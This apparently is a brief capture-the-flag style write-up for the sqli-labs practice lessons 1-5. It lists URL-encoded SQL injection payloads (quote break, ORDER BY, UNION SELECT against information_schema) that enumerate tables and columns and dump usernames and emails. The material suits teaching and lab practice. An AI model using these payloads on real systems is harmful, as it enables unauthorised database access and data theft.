__sqli-labs lesson ```1-5```__

__desc__

 In this challenge we have to dump all the details from the database 

 
 __solution__
  first we have to pass the __```id```__ parameter and pass a numeric value,the we have to fuzz through 
  the id paramete and find the sqli
  when we pass ```'``` we can break the qurey and by adding ```--+``` after we can complete the query
  the we can find the number of table using ```order by``` up to some number
  * ```/?id=-1%27%20order by ```
  we can find the name of tables using:
  
 * ```/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+```
  we can find the column of each table:
  
 * ```/Less-2/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27uagents%27--+```
 we can find the data of each column of the table by:
 
 *```Less-2/?id=%27-1%27%20union%20select%201,group_concat(username),3%20from%20users--+```
we can find the data of column of the table by:
*```Less-3/?id=l%27)union%20select%201,group_concat(id),group_concat(email_id)%20from%20emails--+```
